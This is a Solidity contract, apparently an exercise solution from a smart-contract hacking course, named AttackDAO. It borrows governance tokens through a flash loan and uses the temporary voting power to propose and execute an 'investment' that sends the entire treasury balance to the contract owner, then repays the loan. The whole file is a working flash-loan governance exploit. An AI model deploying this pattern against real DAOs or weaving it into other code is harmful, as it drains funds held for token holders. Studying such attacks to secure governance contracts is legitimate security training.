// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./LendingPool.sol";
import "./IDAOToken.sol";
import "./Governance.sol";
import "./Treasury.sol";

contract AttackDAO is Ownable {
    LendingPool pool;
    Governance governance;
    IDAOToken token;
    Treasury treasury;

    constructor(address _pool, address _tokenAddress, address _govAddress, address payable _treasuryAddress) {
        pool = LendingPool(_pool);
        token = IDAOToken(_tokenAddress);
        governance = Governance(_govAddress);
        treasury = Treasury(_treasuryAddress);
    }

    function attack(uint256 borrowAmount) external {
        pool.flashLoan(borrowAmount);
    }

    function callBack(uint256 borrowAmount) external {
        uint256 inv_id = governance.suggestInvestment(owner(), address(treasury).balance);
        governance.executeInvestment(inv_id);

        // pay back the flash loan
        token.transfer(address(pool), borrowAmount);
    }
}
